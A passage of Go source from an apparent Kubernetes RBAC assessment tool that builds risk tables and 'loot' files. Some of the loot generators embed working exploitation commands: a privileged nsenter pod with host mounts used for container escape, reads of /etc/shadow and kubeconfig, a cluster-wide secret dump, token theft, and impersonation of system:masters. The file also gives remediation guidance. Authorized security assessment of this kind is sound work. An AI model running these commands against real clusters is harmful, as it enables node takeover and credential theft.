	for _, crb := range clusterRoleBindings {
		if len(crb.Subjects) == 0 {
			emptyBindings++
		}
	}
	if emptyBindings > 0 {
		misconfigurations = append(misconfigurations,
			fmt.Sprintf("Found %d ClusterRoleBindings with no subjects (orphaned bindings)", emptyBindings))
	}

	// Check for anonymous/unauthenticated access
	for _, p := range permissions {
		if p.SubjectName == "system:unauthenticated" || p.SubjectName == "system:anonymous" {
			misconfigurations = append(misconfigurations,
				fmt.Sprintf("Anonymous/unauthenticated user has permissions: %s on %s", p.Verb, p.Resource))
			break
		}
	}

	return misconfigurations
}

// generateTable creates the table output
func generatePermissionsTable(findings []PermissionFinding) internal.TableFile {
	headers := []string{
		"Risk Level",
		"Subject",
		"Namespace",
		"Role/ClusterRole",
		"Verb",
		"Resource",
		"Resource Names",
		"API Group",
		"Scope",
		"Escalation Risk",
		"Dangerous Patterns",
		"SA AutoMount",
		"Workloads",
		"Security Issues",
		"Attack Paths",
		"Recommendations",
	}

	var rows [][]string

	// Deduplicate findings by key fields
	seen := make(map[string]bool)
	var uniqueFindings []PermissionFinding

	for _, f := range findings {
		key := fmt.Sprintf("%s|%s|%s|%s|%s|%s|%s|%s",
			f.SubjectKind, f.SubjectName, f.SubjectNamespace, f.Verb, f.Resource, f.APIGroup, f.Role, f.ClusterRole)
		if !seen[key] {
			seen[key] = true
			uniqueFindings = append(uniqueFindings, f)
		}
	}

	for _, f := range uniqueFindings {
		subject := fmt.Sprintf("%s/%s", f.SubjectKind, f.SubjectName)
		roleInfo := k8sinternal.NonEmpty(f.ClusterRole)
		if roleInfo == "" {
			roleInfo = k8sinternal.NonEmpty(f.Role)
		}

		resourceNames := "<ALL>"
		if len(f.ResourceNames) > 0 {
			resourceNames = strings.Join(f.ResourceNames, ", ")
			if len(resourceNames) > 50 {
				resourceNames = resourceNames[:50] + "..."
			}
		}

		dangPatterns := strings.Join(f.DangerousPermissions, ", ")
		if len(dangPatterns) > 80 {
			dangPatterns = dangPatterns[:80] + "..."
		}

		saAutoMount := "N/A"
		if f.IsServiceAccount {
			if f.AutomountServiceToken {
				saAutoMount = "Yes"
			} else {
				saAutoMount = "No"
			}
		}

		workloads := "N/A"
		if f.IsServiceAccount {
			if f.WorkloadCount > 0 {
				workloads = fmt.Sprintf("%d pods", f.WorkloadCount)
			} else {
				workloads = "Unused"
			}
		}

		issues := strings.Join(f.SecurityIssues, "; ")
		if len(issues) > 150 {
			issues = issues[:150] + "..."
		}

		attackPaths := strings.Join(f.AttackPaths, " | ")
		if len(attackPaths) > 100 {
			attackPaths = attackPaths[:100] + "..."
		}

		recommendations := ""
		if f.HasResourceNameRestriction {
			recommendations = "Resource-scoped (good)"
		} else {
			recommendations = "Consider adding resourceNames restriction"
		}
		if f.RiskLevel == "CRITICAL" || f.RiskLevel == "HIGH" {
			recommendations = "REVIEW AND RESTRICT"
		}

		row := []string{
			f.RiskLevel,
			subject,
			f.Namespace,
			roleInfo,
			f.Verb,
			f.Resource,
			resourceNames,
			k8sinternal.NonEmpty(f.APIGroup),
			f.Scope,
			k8sinternal.NonEmpty(f.EscalationRisk),
			dangPatterns,
			saAutoMount,
			workloads,
			issues,
			attackPaths,
			recommendations,
		}
		rows = append(rows, row)
	}

	// Sort by risk level, then subject
	sort.SliceStable(rows, func(i, j int) bool {
		if rows[i][0] != rows[j][0] {
			return permissionsRiskLevelValue(rows[i][0]) > permissionsRiskLevelValue(rows[j][0])
		}
		return rows[i][1] < rows[j][1]
	})

	return internal.TableFile{
		Name:   "Permissions",
		Header: headers,
		Body:   rows,
	}
}

// generateLootFiles creates all loot files
func generatePermissionsLootFiles(findings []PermissionFinding, escalationPaths []EscalationPath,
	saAnalyses []ServiceAccountAnalysis, misconfigurations []string) []internal.LootFile {
	var lootFiles []internal.LootFile

	// 1. Permissions-Enum.txt (enhanced)
	lootFiles = append(lootFiles, generateEnumLoot(findings))

	// 2. Permissions-Privilege-Escalation.txt (NEW)
	lootFiles = append(lootFiles, generateEscalationLoot(escalationPaths))

	// 3. Permissions-Dangerous-Patterns.txt (NEW)
	lootFiles = append(lootFiles, generateDangerousPatternsLoot(findings))

	// 4. Permissions-Service-Accounts.txt (NEW)
	lootFiles = append(lootFiles, generateServiceAccountsLoot(saAnalyses))

	// 5. Permissions-Cluster-Admin.txt (NEW)
	lootFiles = append(lootFiles, generateClusterAdminLoot(findings))

	// 6. Permissions-Secret-Access.txt (NEW)
	lootFiles = append(lootFiles, generateSecretAccessLoot(findings))

	// 7. Permissions-Pod-Creation.txt (NEW)
	lootFiles = append(lootFiles, generatePodCreationLoot(findings))

	// 8. Permissions-Misconfigurations.txt (NEW)
	lootFiles = append(lootFiles, generateMisconfigurationsLoot(misconfigurations))

	// 9. Permissions-Impersonate.txt (enhanced)
	lootFiles = append(lootFiles, generateImpersonateLoot(findings))

	// 10. Permissions-Attack-Paths.txt (NEW)
	lootFiles = append(lootFiles, generatePermissionsAttackPathsLoot(findings))

	// 11. Permissions-ExamplePodYAML.txt (enhanced)
	lootFiles = append(lootFiles, generatePermissionsPodYAMLsLoot(findings))

	// 12. Permissions-Remediation.txt (NEW)
	lootFiles = append(lootFiles, generateRemediationLoot(findings))

	return lootFiles
}

func generateEnumLoot(findings []PermissionFinding) internal.LootFile {
	var content []string

	content = append(content, "═══════════════════════════════════════════════════════════════")
	content = append(content, "         RBAC PERMISSIONS ENUMERATION")
	content = append(content, "═══════════════════════════════════════════════════════════════")
	content = append(content, "")

	if globals.KubeContext != "" {
		content = append(content, fmt.Sprintf("kubectl config use-context %s\n", globals.KubeContext))
	}

	content = append(content, "# List all ClusterRoles")
	content = append(content, "kubectl get clusterroles")
	content = append(content, "")

	content = append(content, "# List all ClusterRoleBindings")
	content = append(content, "kubectl get clusterrolebindings")
	content = append(content, "")

	content = append(content, "# List Roles and RoleBindings in all namespaces")
	content = append(content, "kubectl get roles,rolebindings -A")
	content = append(content, "")

	content = append(content, "# Check your current permissions")
	content = append(content, "kubectl auth can-i --list")
	content = append(content, "")

	content = append(content, "# Check specific permission")
	content = append(content, "kubectl auth can-i create pods")
	content = append(content, "kubectl auth can-i get secrets -A")
	content = append(content, "kubectl auth can-i create clusterrolebindings")
	content = append(content, "")

	return internal.LootFile{
		Name:     "Permissions-Enum",
		Contents: strings.Join(content, "\n"),
	}
}

func generateEscalationLoot(escalationPaths []EscalationPath) internal.LootFile {
	var content []string

	content = append(content, "═══════════════════════════════════════════════════════════════")
	content = append(content, "         PRIVILEGE ESCALATION PATHS")
	content = append(content, "═══════════════════════════════════════════════════════════════")
	content = append(content, "")

	if len(escalationPaths) == 0 {
		content = append(content, "✓ No privilege escalation paths detected")
		content = append(content, "")
	} else {
		content = append(content, fmt.Sprintf("⚠️  WARNING: %d PRIVILEGE ESCALATION PATHS DETECTED", len(escalationPaths)))
		content = append(content, "")

		for i, path := range escalationPaths {
			content = append(content, fmt.Sprintf("ESCALATION PATH %d [%s]", i+1, path.RiskLevel))
			content = append(content, fmt.Sprintf("Subject: %s", path.Subject))
			content = append(content, fmt.Sprintf("Starting Permission: %s", path.StartPermission))
			content = append(content, "")
			content = append(content, "Steps:")
			for j, step := range path.Steps {
				content = append(content, fmt.Sprintf("  %d. %s", j+1, step))
			}
			content = append(content, "")
			content = append(content, fmt.Sprintf("End Result: %s", path.EndResult))
			content = append(content, "")
			content = append(content, "───────────────────────────────────────────────────────────────")
			content = append(content, "")
		}
	}

	return internal.LootFile{
		Name:     "Permissions-Privilege-Escalation",
		Contents: strings.Join(content, "\n"),
	}
}

func generateDangerousPatternsLoot(findings []PermissionFinding) internal.LootFile {
	var content []string

	content = append(content, "═══════════════════════════════════════════════════════════════")
	content = append(content, "         DANGEROUS PERMISSION PATTERNS")
	content = append(content, "═══════════════════════════════════════════════════════════════")
	content = append(content, "")

	// Group findings by pattern
	patternFindings := make(map[string][]PermissionFinding)
	for _, f := range findings {
		for _, pattern := range f.DangerousPermissions {
			patternFindings[pattern] = append(patternFindings[pattern], f)
		}
	}

	if len(patternFindings) == 0 {
		content = append(content, "✓ No dangerous permission patterns detected")
		content = append(content, "")
	} else {
		for _, pattern := range dangerousPermissionPatterns {
			if findings, ok := patternFindings[pattern.Name]; ok {
				content = append(content, fmt.Sprintf("PATTERN: %s [%s]", pattern.Name, pattern.Severity))
				content = append(content, fmt.Sprintf("Description: %s", pattern.Description))
				content = append(content, "")
				content = append(content, "Exploitation:")
				content = append(content, fmt.Sprintf("  %s", pattern.ExploitGuidance))
				content = append(content, "")
				content = append(content, fmt.Sprintf("Affected Subjects (%d):", len(findings)))
				for _, f := range findings {
					content = append(content, fmt.Sprintf("  • %s/%s in namespace %s", f.SubjectKind, f.SubjectName, f.Namespace))
				}
				content = append(content, "")
				content = append(content, "───────────────────────────────────────────────────────────────")
				content = append(content, "")
			}
		}
	}

	return internal.LootFile{
		Name:     "Permissions-Dangerous-Patterns",
		Contents: strings.Join(content, "\n"),
	}
}

func generateServiceAccountsLoot(saAnalyses []ServiceAccountAnalysis) internal.LootFile {
	var content []string

	content = append(content, "═══════════════════════════════════════════════════════════════")
	content = append(content, "         SERVICE ACCOUNT SECURITY ANALYSIS")
	content = append(content, "═══════════════════════════════════════════════════════════════")
	content = append(content, "")

	criticalSAs := []ServiceAccountAnalysis{}
	highSAs := []ServiceAccountAnalysis{}

	for _, sa := range saAnalyses {
		if sa.RiskLevel == "CRITICAL" {
			criticalSAs = append(criticalSAs, sa)
		} else if sa.RiskLevel == "HIGH" {
			highSAs = append(highSAs, sa)
		}
	}

	content = append(content, fmt.Sprintf("Total Service Accounts: %d", len(saAnalyses)))
	content = append(content, fmt.Sprintf("CRITICAL Risk: %d", len(criticalSAs)))
	content = append(content, fmt.Sprintf("HIGH Risk: %d", len(highSAs)))
	content = append(content, "")

	if len(criticalSAs) > 0 || len(highSAs) > 0 {
		content = append(content, "HIGH-RISK SERVICE ACCOUNTS:")
		content = append(content, "")

		for _, sa := range append(criticalSAs, highSAs...) {
			content = append(content, fmt.Sprintf("ServiceAccount: %s/%s [%s]", sa.Namespace, sa.Name, sa.RiskLevel))
			content = append(content, fmt.Sprintf("  Automount Token: %t", sa.AutomountToken))
			content = append(content, fmt.Sprintf("  Bound Pods: %d", sa.BoundPodCount))
			content = append(content, fmt.Sprintf("  Permissions: %d", len(sa.Permissions)))
			content = append(content, fmt.Sprintf("  Has Cluster Access: %t", sa.HasClusterAccess))
			content = append(content, fmt.Sprintf("  Has Secrets Access: %t", sa.HasSecretsAccess))
			content = append(content, fmt.Sprintf("  Has Pod Create Access: %t", sa.HasPodCreateAccess))

			if sa.IsDefault {
				content = append(content, "  ⚠️  WARNING: Using default service account")
			}
			if sa.IsOverPrivileged {
				content = append(content, "  ⚠️  WARNING: Over-privileged service account")
			}
			if sa.IsUnused {
				content = append(content, "  ℹ️  INFO: Unused (no pods)")
			}

			if len(sa.SecurityIssues) > 0 {
				content = append(content, "  Security Issues:")
				for _, issue := range sa.SecurityIssues {
					content = append(content, fmt.Sprintf("    • %s", issue))
				}
			}

			if len(sa.BoundPods) > 0 && len(sa.BoundPods) <= 10 {
				content = append(content, "  Bound Pods:")
				for _, pod := range sa.BoundPods {
					content = append(content, fmt.Sprintf("    • %s", pod))
				}
			}

			content = append(content, "")
		}
	} else {
		content = append(content, "✓ No high-risk service accounts detected")
		content = append(content, "")
	}

	return internal.LootFile{
		Name:     "Permissions-Service-Accounts",
		Contents: strings.Join(content, "\n"),
	}
}

func generateClusterAdminLoot(findings []PermissionFinding) internal.LootFile {
	var content []string

	content = append(content, "═══════════════════════════════════════════════════════════════")
	content = append(content, "         CLUSTER-ADMIN ACCESS")
	content = append(content, "═══════════════════════════════════════════════════════════════")
	content = append(content, "")

	clusterAdmins := []PermissionFinding{}
	for _, f := range findings {
		if f.AllowsClusterAdmin {
			clusterAdmins = append(clusterAdmins, f)
		}
	}

	if len(clusterAdmins) == 0 {
		content = append(content, "✓ No cluster-admin access detected")
		content = append(content, "")
	} else {
		content = append(content, fmt.Sprintf("⚠️  WARNING: %d subjects have cluster-admin access", len(clusterAdmins)))
		content = append(content, "")

		// Deduplicate by subject
		seen := make(map[string]bool)
		for _, f := range clusterAdmins {
			key := fmt.Sprintf("%s/%s", f.SubjectKind, f.SubjectName)
			if !seen[key] {
				seen[key] = true
				content = append(content, fmt.Sprintf("• %s/%s (namespace: %s)", f.SubjectKind, f.SubjectName, f.Namespace))
				content = append(content, fmt.Sprintf("  Via: %s", func() string { if f.ClusterRole != "" { return f.ClusterRole }; return f.Role }()))
				content = append(content, "  Impact: Full cluster control - can read/modify/delete any resource")
				content = append(content, "")
			}
		}
	}

	return internal.LootFile{
		Name:     "Permissions-Cluster-Admin",
		Contents: strings.Join(content, "\n"),
	}
}

func generateSecretAccessLoot(findings []PermissionFinding) internal.LootFile {
	var content []string

	content = append(content, "═══════════════════════════════════════════════════════════════")
	content = append(content, "         SECRET ACCESS PERMISSIONS")
	content = append(content, "═══════════════════════════════════════════════════════════════")
	content = append(content, "")

	secretAccess := []PermissionFinding{}
	for _, f := range findings {
		if f.AllowsReadSecrets {
			secretAccess = append(secretAccess, f)
		}
	}

	if len(secretAccess) == 0 {
		content = append(content, "✓ No secret access permissions detected")
		content = append(content, "")
	} else {
		content = append(content, fmt.Sprintf("⚠️  %d subjects can access secrets", len(secretAccess)))
		content = append(content, "")

		// Group by scope
		clusterWide := []PermissionFinding{}
		namespaced := []PermissionFinding{}

		for _, f := range secretAccess {
			if f.Scope == "cluster" {
				clusterWide = append(clusterWide, f)
			} else {
				namespaced = append(namespaced, f)
			}
		}

		if len(clusterWide) > 0 {
			content = append(content, "CLUSTER-WIDE SECRET ACCESS:")
			content = append(content, "")
			for _, f := range clusterWide {
				content = append(content, fmt.Sprintf("• %s/%s", f.SubjectKind, f.SubjectName))
				content = append(content, fmt.Sprintf("  Verb: %s", f.Verb))
				content = append(content, "  Impact: Can access ALL secrets in ALL namespaces")
				content = append(content, "  Exploitation:")
				content = append(content, "    kubectl get secrets -A -o json | jq '.items[].data | map_values(@base64d)'")
				content = append(content, "")
			}
		}

		if len(namespaced) > 0 {
			content = append(content, fmt.Sprintf("NAMESPACE-SCOPED SECRET ACCESS (%d):", len(namespaced)))
			content = append(content, "")
			for _, f := range namespaced {
				content = append(content, fmt.Sprintf("• %s/%s in namespace %s", f.SubjectKind, f.SubjectName, f.Namespace))
			}
			content = append(content, "")
		}
	}

	return internal.LootFile{
		Name:     "Permissions-Secret-Access",
		Contents: strings.Join(content, "\n"),
	}
}

func generatePodCreationLoot(findings []PermissionFinding) internal.LootFile {
	var content []string

	content = append(content, "═══════════════════════════════════════════════════════════════")
	content = append(content, "         POD CREATION AND EXEC PERMISSIONS")
	content = append(content, "═══════════════════════════════════════════════════════════════")
	content = append(content, "")

	podCreators := []PermissionFinding{}
	podExecers := []PermissionFinding{}

	for _, f := range findings {
		if f.AllowsCreatePods {
			podCreators = append(podCreators, f)
		}
		if f.AllowsExecPods {
			podExecers = append(podExecers, f)
		}
	}

	if len(podCreators) > 0 {
		content = append(content, fmt.Sprintf("⚠️  CRITICAL: %d subjects can create pods", len(podCreators)))
		content = append(content, "")
		content = append(content, "Impact: Container escape → node root → cluster takeover")
		content = append(content, "")

		for _, f := range podCreators {
			content = append(content, fmt.Sprintf("• %s/%s (namespace: %s)", f.SubjectKind, f.SubjectName, f.Namespace))
		}
		content = append(content, "")

		content = append(content, "Container Escape Exploitation:")
		content = append(content, "")
		content = append(content, "# Create privileged pod with hostPath to /")
		content = append(content, "kubectl run escape --image=alpine --restart=Never --overrides='{")
		content = append(content, "  \"spec\": {")
		content = append(content, "    \"hostNetwork\": true,")
		content = append(content, "    \"hostPID\": true,")
		content = append(content, "    \"containers\": [{")
		content = append(content, "      \"name\": \"escape\",")
		content = append(content, "      \"image\": \"alpine\",")
		content = append(content, "      \"command\": [\"nsenter\", \"-t\", \"1\", \"-m\", \"-u\", \"-n\", \"-i\", \"sh\"],")
		content = append(content, "      \"securityContext\": {\"privileged\": true},")
		content = append(content, "      \"volumeMounts\": [{\"mountPath\": \"/host\", \"name\": \"host\"}]")
		content = append(content, "    }],")
		content = append(content, "    \"volumes\": [{\"name\": \"host\", \"hostPath\": {\"path\": \"/\"}}]")
		content = append(content, "  }")
		content = append(content, "}'")
		content = append(content, "")
		content = append(content, "# Exec into pod")
		content = append(content, "kubectl exec -it escape -- sh")
		content = append(content, "")
		content = append(content, "# Access host filesystem")
		content = append(content, "cat /host/etc/shadow")
		content = append(content, "cat /host/root/.kube/config")
		content = append(content, "")
	}

	if len(podExecers) > 0 {
		content = append(content, "───────────────────────────────────────────────────────────────")
		content = append(content, "")
		content = append(content, fmt.Sprintf("⚠️  %d subjects can exec into pods", len(podExecers)))
		content = append(content, "")
		content = append(content, "Impact: RCE in containers → steal secrets → lateral movement")
		content = append(content, "")

		for _, f := range podExecers {
			content = append(content, fmt.Sprintf("• %s/%s (namespace: %s)", f.SubjectKind, f.SubjectName, f.Namespace))
		}
		content = append(content, "")

		content = append(content, "Exploitation:")
		content = append(content, "kubectl exec -it <pod> -n <namespace> -- /bin/sh")
		content = append(content, "cat /var/run/secrets/kubernetes.io/serviceaccount/token")
		content = append(content, "")
	}

	if len(podCreators) == 0 && len(podExecers) == 0 {
		content = append(content, "✓ No pod creation or exec permissions detected")
		content = append(content, "")
	}

	return internal.LootFile{
		Name:     "Permissions-Pod-Creation",
		Contents: strings.Join(content, "\n"),
	}
}

func generateMisconfigurationsLoot(misconfigurations []string) internal.LootFile {
	var content []string

	content = append(content, "═══════════════════════════════════════════════════════════════")
	content = append(content, "         RBAC MISCONFIGURATIONS")
	content = append(content, "═══════════════════════════════════════════════════════════════")
	content = append(content, "")

	if len(misconfigurations) == 0 {
		content = append(content, "✓ No RBAC misconfigurations detected")
		content = append(content, "")
	} else {
		content = append(content, fmt.Sprintf("⚠️  %d misconfigurations detected", len(misconfigurations)))
		content = append(content, "")

		for i, misc := range misconfigurations {
			content = append(content, fmt.Sprintf("%d. %s", i+1, misc))
		}
		content = append(content, "")
	}

	return internal.LootFile{
		Name:     "Permissions-Misconfigurations",
		Contents: strings.Join(content, "\n"),
	}
}

func generateImpersonateLoot(findings []PermissionFinding) internal.LootFile {
	var content []string

	content = append(content, "═══════════════════════════════════════════════════════════════")
	content = append(content, "         IMPERSONATION PERMISSIONS")
	content = append(content, "═══════════════════════════════════════════════════════════════")
	content = append(content, "")

	if globals.KubeContext != "" {
		content = append(content, fmt.Sprintf("kubectl config use-context %s\n", globals.KubeContext))
	}

	impersonators := []PermissionFinding{}
	for _, f := range findings {
		if f.AllowsImpersonate {
			impersonators = append(impersonators, f)
		}
	}

	if len(impersonators) == 0 {
		content = append(content, "✓ No impersonation permissions detected")
		content = append(content, "")
	} else {
		content = append(content, fmt.Sprintf("⚠️  %d subjects can impersonate others", len(impersonators)))
		content = append(content, "")

		for _, f := range impersonators {
			content = append(content, fmt.Sprintf("Subject: %s/%s", f.SubjectKind, f.SubjectName))
			content = append(content, fmt.Sprintf("  Can impersonate: %s", f.Resource))
			content = append(content, "")
			content = append(content, "  Exploitation examples:")
			content = append(content, "    # Impersonate admin user")
			content = append(content, "    kubectl get secrets -A --as=admin")
			content = append(content, "")
			content = append(content, "    # Impersonate system:masters group")
			content = append(content, "    kubectl get secrets -A --as=admin --as-group=system:masters")
			content = append(content, "")
			content = append(content, "    # Impersonate service account")
			content = append(content, "    kubectl get pods --as=system:serviceaccount:kube-system:default")
			content = append(content, "")
		}
	}

	return internal.LootFile{
		Name:     "Permissions-Impersonate",
		Contents: strings.Join(content, "\n"),
	}
}

func generatePermissionsAttackPathsLoot(findings []PermissionFinding) internal.LootFile {
	var content []string

	content = append(content, "═══════════════════════════════════════════════════════════════")
	content = append(content, "         COMPLETE ATTACK PATHS")
	content = append(content, "═══════════════════════════════════════════════════════════════")
	content = append(content, "")

	// Collect all unique attack paths
	pathSet := make(map[string]bool)
	var uniquePaths []string

	for _, f := range findings {
		for _, path := range f.AttackPaths {
			if !pathSet[path] {
				pathSet[path] = true
				uniquePaths = append(uniquePaths, path)
			}
		}
	}

	if len(uniquePaths) > 0 {
		for i, path := range uniquePaths {
			content = append(content, fmt.Sprintf("Attack Path %d:", i+1))
			content = append(content, fmt.Sprintf("  %s", path))
			content = append(content, "")
		}
	} else {
		content = append(content, "No specific attack paths identified")
		content = append(content, "")
	}

	return internal.LootFile{
		Name:     "Permissions-Attack-Paths",
		Contents: strings.Join(content, "\n"),
	}
}

func generatePermissionsPodYAMLsLoot(findings []PermissionFinding) internal.LootFile {
	var content []string

	content = append(content, "═══════════════════════════════════════════════════════════════")
	content = append(content, "         EXAMPLE POD YAMLs FOR SERVICE ACCOUNTS")
	content = append(content, "═══════════════════════════════════════════════════════════════")
	content = append(content, "")

	// Track unique service accounts
	seenSA := make(map[string]bool)

	for _, f := range findings {
		if f.IsServiceAccount {
			key := fmt.Sprintf("%s/%s", f.Namespace, f.SubjectName)
			if seenSA[key] {
				continue
			}
			seenSA[key] = true

			ns := f.Namespace
			if ns == "<cluster>" {
				ns = "default"
			}

			podName := fmt.Sprintf("test-%s", strings.ReplaceAll(f.SubjectName, ":", "-"))
			pod := corev1.Pod{
				TypeMeta: metav1.TypeMeta{
					APIVersion: "v1",
					Kind:       "Pod",
				},
				ObjectMeta: metav1.ObjectMeta{
					Name:      podName,
					Namespace: ns,
				},
				Spec: corev1.PodSpec{
					ServiceAccountName: f.SubjectName,
					Containers: []corev1.Container{
						{
							Name:    "alpine",
							Image:   "alpine:latest",
							Command: []string{"sh", "-c", "sleep 3600"},
						},
					},
				},
			}

			yamlData, err := yaml.Marshal(pod)
			if err == nil {
				content = append(content, fmt.Sprintf("# ServiceAccount: %s (namespace: %s)", f.SubjectName, ns))
				content = append(content, string(yamlData))
				content = append(content, "---")
				content = append(content, "")
			}
		}
	}

	return internal.LootFile{
		Name:     "Permissions-ExamplePodYAML",
		Contents: strings.Join(content, "\n"),
	}
}

func generateRemediationLoot(findings []PermissionFinding) internal.LootFile {
	var content []string

	content = append(content, "═══════════════════════════════════════════════════════════════")
	content = append(content, "         REMEDIATION RECOMMENDATIONS")
	content = append(content, "═══════════════════════════════════════════════════════════════")
	content = append(content, "")

	content = append(content, "GENERAL PRINCIPLES:")
	content = append(content, "")
	content = append(content, "1. Principle of Least Privilege")
	content = append(content, "   - Grant only the minimum permissions required")
	content = append(content, "   - Use namespace-scoped Roles instead of ClusterRoles when possible")
	content = append(content, "   - Use resourceNames to restrict access to specific resources")
	content = append(content, "")

	content = append(content, "2. Service Account Best Practices")
	content = append(content, "   - Never use the 'default' service account for workloads")
	content = append(content, "   - Create dedicated service accounts per application")
	content = append(content, "   - Set automountServiceAccountToken: false when not needed")
	content = append(content, "")

	content = append(content, "3. Avoid Dangerous Permissions")
	content = append(content, "   - Never grant wildcard (*) for resources or verbs")
	content = append(content, "   - Restrict 'create pods' permission - enables container escape")
	content = append(content, "   - Restrict 'create rolebindings' - enables privilege escalation")
	content = append(content, "   - Restrict 'impersonate' permission - enables identity theft")
	content = append(content, "   - Restrict 'get secrets' permission - enables credential theft")
	content = append(content, "")

	content = append(content, "SPECIFIC REMEDIATIONS:")
	content = append(content, "")

	// Analyze findings for specific recommendations
	criticalFindings := []PermissionFinding{}
	for _, f := range findings {
		if f.RiskLevel == "CRITICAL" || f.RiskLevel == "HIGH" {
			criticalFindings = append(criticalFindings, f)
		}
	}

	if len(criticalFindings) > 0 {
		for i, f := range criticalFindings {
			if i >= 10 { // Limit to top 10
				break
			}

			content = append(content, fmt.Sprintf("%d. Subject: %s/%s", i+1, f.SubjectKind, f.SubjectName))
			content = append(content, fmt.Sprintf("   Risk Level: %s", f.RiskLevel))
			content = append(content, fmt.Sprintf("   Permission: %s %s", f.Verb, f.Resource))
			content = append(content, "")

			if f.AllowsClusterAdmin {
				content = append(content, "   Recommendation: Remove cluster-admin role unless absolutely necessary")
			} else if f.AllowsCreateRoleBindings {
				content = append(content, "   Recommendation: Remove create rolebindings permission - direct privilege escalation path")
			} else if f.AllowsCreatePods {
				content = append(content, "   Recommendation: Remove create pods permission or use Pod Security Policies/Admission Controllers")
			} else if f.AllowsReadSecrets && f.Scope == "cluster" {
				content = append(content, "   Recommendation: Scope secret access to specific namespaces using Roles instead of ClusterRoles")
			} else if !f.HasResourceNameRestriction && f.RiskLevel == "HIGH" {
				content = append(content, "   Recommendation: Add resourceNames restriction to limit scope")
			}

			content = append(content, "")
		}
	}

	content = append(content, "EXAMPLE: Restrict Service Account")
	content = append(content, "")
	content = append(content, "# Instead of cluster-admin, create specific role:")
	content = append(content, "apiVersion: rbac.authorization.k8s.io/v1")
	content = append(content, "kind: Role")
	content = append(content, "metadata:")
	content = append(content, "  name: app-role")
	content = append(content, "  namespace: default")
	content = append(content, "rules:")
	content = append(content, "- apiGroups: [\"\"]")
	content = append(content, "  resources: [\"configmaps\"]")
	content = append(content, "  resourceNames: [\"app-config\"]  # Restrict to specific resource")
	content = append(content, "  verbs: [\"get\"]")
	content = append(content, "")

	return internal.LootFile{
		Name:     "Permissions-Remediation",
		Contents: strings.Join(content, "\n"),
	}
}

// Helper functions

type explodedPerm struct {
	Verb     string
	Resource string
	APIGroup string
}

func explodeRule(rule v1.PolicyRule) []explodedPerm {
	var perms []explodedPerm

	verbs := rule.Verbs
	resources := rule.Resources
	apiGroups := rule.APIGroups

	if len(verbs) == 0 {
		verbs = []string{"-"}
	}
	if len(resources) == 0 {
		resources = []string{"-"}
	}
	if len(apiGroups) == 0 {
		apiGroups = []string{"-"}
	}

	for _, verb := range verbs {
		for _, res := range resources {
			for _, group := range apiGroups {
				perms = append(perms, explodedPerm{
					Verb:     verb,
					Resource: res,
					APIGroup: group,
				})
			}
		}
	}

	return perms
}

func hasPermission(perms []PermissionFinding, verb, resource string) bool {
	for _, p := range perms {
		if (p.Verb == verb || p.Verb == "*") && (p.Resource == resource || p.Resource == "*" || resource == "") {
			return true
		}
	}
	return false
}

func permissionsRiskLevelValue(level string) int {
	switch level {
	case "CRITICAL":
		return 4
	case "HIGH":
		return 3
	case "MEDIUM":
		return 2
	case "LOW":
		return 1
	default:
		return 0
	}
}
